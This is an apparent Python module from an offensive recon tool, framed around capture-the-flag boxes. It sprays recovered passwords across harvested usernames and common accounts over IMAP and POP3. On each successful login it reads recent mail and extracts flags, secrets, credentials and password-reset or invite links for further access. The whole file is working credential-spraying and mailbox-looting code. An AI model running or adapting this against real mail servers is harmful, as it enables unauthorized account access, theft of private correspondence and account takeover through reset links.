"""Credential-driven mailbox reading (POP3 / IMAP).

Recon recovers a password and a username scheme (an onboarding doc on an NFS
share, an email harvested off the site, an AD account); the mailbox is where the
next hop usually is — a reset link, a second credential, or the flag itself.
This pass takes every username candidate scryer has learned, tries each with the
recovered passwords over IMAP/POP3, and on a hit dumps recent message bodies and
scans them for flags, credentials, and links.

Pure standard library (imaplib / poplib). Runs only once scryer already holds a
credential, so it isn't a blind brute — it's replaying known passwords against
the accounts the box itself told us about.
"""

from __future__ import annotations

import imaplib
import poplib
import re
from email import message_from_bytes
from email.header import decode_header
from typing import List, Set

from ...core import utils
from ...core.report import HostReport, Finding
from ...data import knowledge

_MAX_ATTEMPTS = 200
_MAX_MSGS = 25
_COMMON = ["admin", "administrator", "root", "info", "support", "test", "mail"]


def run(host: HostReport, opts) -> None:
    ports = {e["port"] for e in host.open_ports}
    imap_p = 993 if 993 in ports else (143 if 143 in ports else None)
    pop_p = 995 if 995 in ports else (110 if 110 in ports else None)
    if not (imap_p or pop_p):
        return
    users = _candidate_users(host)
    pws = list(dict.fromkeys(host.creds))
    if not users or not pws:
        return

    ip = host.resolved_ip or host.target
    utils.section(f"MAIL {ip}")
    utils.log("info", f"replaying {len(pws)} password(s) across {len(users)} "
                      f"mailbox candidate(s)", indent=1)

    tried, hits = 0, 0
    for user in users:
        for pw in pws:
            if tried >= _MAX_ATTEMPTS:
                utils.log("dim", "mail attempt cap reached", indent=1)
                return
            tried += 1
            body = None
            if imap_p:
                body = _imap(ip, imap_p, user, pw)
            if body is None and pop_p:
                body = _pop(ip, pop_p, user, pw)
            if body is None:
                continue
            hits += 1
            utils.log("hot", f"mailbox login: {user}:{pw}", indent=1)
            host.add_cred(pw)
            host.add(Finding(
                title=f"Mailbox access: {user}",
                detail=f"{user}:{pw} (IMAP/POP3). Read for a reset link, a second "
                       "credential, or the flag.", severity="high",
                category="cred", port=imap_p or pop_p, service="mail",
                evidence=f"{user}:{pw}"))
            _mine(host, user, body, imap_p or pop_p)
            break            # this password works for this user; next user
    if not hits:
        utils.log("dim", "no mailbox opened with the known credentials", indent=1)


# --------------------------------------------------------------------------
def _candidate_users(host: HostReport) -> List[str]:
    users: List[str] = []
    emails: Set[str] = host.__dict__.get("emails", set())
    for e in emails:
        users.append(e)                       # full address
        users.append(e.split("@", 1)[0])      # local part
    # usernames derived from names/conventions in looted onboarding docs
    users += sorted(host.__dict__.get("usernames", set()))
    users += list(host.__dict__.get("ad_users", []))
    # local-parts of any leaked emails in findings
    for f in host.findings:
        for m in re.findall(r"([A-Za-z0-9._%+-]+)@", f.title + " " + (f.detail or "")):
            users.append(m)
    users += _COMMON
    # dedupe, keep order, cap
    seen, out = set(), []
    for u in users:
        u = u.strip()
        if u and u.lower() not in seen:
            seen.add(u.lower())
            out.append(u)
    return out[:40]


def _imap(ip, port, user, pw):
    try:
        M = (imaplib.IMAP4_SSL(ip, port) if port == 993
             else imaplib.IMAP4(ip, port))
        if port == 143:
            try:
                M.starttls()
            except Exception:
                pass
        M.login(user, pw)
    except (imaplib.IMAP4.error, OSError):
        return None
    text = []
    try:
        M.select("INBOX", readonly=True)
        typ, data = M.search(None, "ALL")
        ids = (data[0].split() if data and data[0] else [])[-_MAX_MSGS:]
        for i in ids:
            typ, msg = M.fetch(i, "(RFC822)")
            if msg and msg[0]:
                text.append(_msg_text(msg[0][1]))
    except (imaplib.IMAP4.error, OSError):
        pass
    finally:
        try:
            M.logout()
        except Exception:
            pass
    return "\n".join(text)


def _pop(ip, port, user, pw):
    try:
        P = (poplib.POP3_SSL(ip, port) if port == 995 else poplib.POP3(ip, port))
        if port == 110:
            try:
                P.stls()
            except Exception:
                pass
        P.user(user)
        P.pass_(pw)
    except (poplib.error_proto, OSError):
        return None
    text = []
    try:
        count = len(P.list()[1])
        for i in range(max(1, count - _MAX_MSGS + 1), count + 1):
            raw = b"\n".join(P.retr(i)[1])
            text.append(_msg_text(raw))
    except (poplib.error_proto, OSError):
        pass
    finally:
        try:
            P.quit()
        except Exception:
            pass
    return "\n".join(text)


def _msg_text(raw: bytes) -> str:
    try:
        msg = message_from_bytes(raw)
    except Exception:
        return raw.decode("latin-1", "replace")
    parts = [_dh(msg.get("subject", "")), _dh(msg.get("from", ""))]
    if msg.is_multipart():
        for p in msg.walk():
            if p.get_content_type() == "text/plain":
                try:
                    parts.append(p.get_payload(decode=True).decode(
                        "utf-8", "replace"))
                except Exception:
                    pass
    else:
        try:
            parts.append(msg.get_payload(decode=True).decode("utf-8", "replace"))
        except Exception:
            parts.append(str(msg.get_payload()))
    return "\n".join(p for p in parts if p)


def _dh(value: str) -> str:
    try:
        out = []
        for txt, enc in decode_header(value):
            out.append(txt.decode(enc or "utf-8", "replace")
                       if isinstance(txt, bytes) else txt)
        return "".join(out)
    except Exception:
        return value


def _mine(host: HostReport, user: str, body: str, port: int) -> None:
    for tok in knowledge.find_flags(body or "", allow_hex=True):
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c(f"║ FLAG (mail: {user})", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(
            title=f"FLAG in {user}'s mailbox", detail=tok, severity="critical",
            category="flag", port=port, service="mail", evidence=tok))
    for _lbl, val, _sev in knowledge.extract_secrets(body):
        host.add_cred(val)
        utils.log("hot", f"secret in mail: {val[:50]}", indent=2)
    for _u, pw in list(knowledge.find_conn_creds(body)):
        host.add_cred(pw)
    # password-reset / onboarding links are the usual next hop
    for link in re.findall(r"https?://[^\s\"'<>]{8,120}", body or "")[:8]:
        if any(k in link.lower() for k in ("reset", "token", "verify", "invite",
                                           "onboard", "setup", "confirm")):
            utils.log("good", f"actionable link in mail: {link}", indent=2)
            host.add(Finding(
                title="Actionable link in mailbox",
                detail=f"{link} (from {user}'s mail — reset/onboarding token)",
                severity="high", category="web", port=port, service="mail",
                evidence=link))
